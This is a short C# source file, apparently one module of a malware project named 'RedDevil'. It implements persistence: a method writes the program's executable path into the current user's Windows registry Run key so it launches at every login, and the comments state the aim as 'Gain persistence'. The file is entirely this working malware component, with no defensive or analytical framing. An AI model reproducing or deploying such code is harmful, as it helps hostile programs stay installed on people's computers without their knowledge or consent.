// Software\Microsoft\Windows\CurrentVersion\Run

using System;

//Gain persistence:
//Use run at start-up feature of the windows.


namespace RedDevil
{
    class Persistence
    {
        // Instance of class GeneralInfo
        GeneralInfo newInstance;
        // Function
        public void AddToStartUp(){
            Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            rkInstance.SetValue("RedDevil",newInstance.ePath);
            rkInstance.Dispose();
            rkInstance.Close();
        }

        // Constructor to iinitialize the values of class GeneralInfo
        public Persistence(GeneralInfo instance)
        {
            newInstance = instance;
        }
    }
}